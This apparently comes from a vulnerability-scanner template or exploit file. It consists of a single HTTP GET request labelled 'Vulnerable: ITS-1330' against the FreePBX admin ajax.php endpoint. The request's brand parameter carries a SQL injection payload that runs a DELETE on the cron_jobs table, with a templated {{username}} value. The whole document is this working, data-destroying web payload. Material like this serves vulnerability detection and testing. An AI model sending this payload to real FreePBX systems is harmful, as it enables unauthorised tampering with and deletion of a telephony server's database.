# Vulnerable: ITS-1330
GET /admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'%20;DELETE%20FROM%20cron_jobs%20WHERE%20jobname='{{username}}'%20--%20
